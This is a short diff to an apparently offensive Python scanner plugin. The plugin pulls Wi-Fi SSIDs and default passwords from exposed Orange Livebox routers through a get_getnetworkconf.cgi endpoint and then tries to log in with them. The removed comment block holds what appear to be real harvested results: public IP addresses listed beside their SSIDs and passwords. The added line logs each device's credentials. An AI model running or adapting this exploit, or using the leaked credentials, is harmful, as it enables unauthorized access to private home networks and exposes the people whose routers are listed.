@@ -96,14 +96,4 @@ class Plugin(IPlugin):
 					password = arr[3][:-4]
 					log.info("Found SSID and default passwd for {} -> {}:{} ".format(res.url,ssid, password))
 					if try_auth(res.url) or try_auth(res.url, password):
-						log.info("VULNERABLE Device {} !!".format(res.url))
-
-'''
--> Orange-C234:3C69C3A5
-[INFO plugins] Found SSID and default passwd for http://90.68.85.77:8080/get_getnetworkconf.cgi -> Orange-5581:SdLXZAA6
-[INFO plugins] Found SSID and default passwd for http://92.187.224.65:8080/get_getnetworkconf.cgi -> Orange-E65E:7624946A
-[INFO plugins] Found SSID and default passwd for http://92.189.41.116:8080/get_getnetworkconf.cgi -> Orange-72F4:xXRaJVDd
-[INFO plugins] Found SSID and default passwd for http://92.187.224.36:8080/get_getnetworkconf.cgi -> Orange-E229:AE429FE7
-[INFO plugins] Found SSID and default passwd for http://85.60.223.24:8080/get_getnetworkconf.cgi -> Orange-1642:ACq3WwLS
-[INFO plugins] Found SSID and defa
-'''
+						log.info("plugin=livebox-20377 device={} SSID={} password={}".format(res.url, ssid, password))
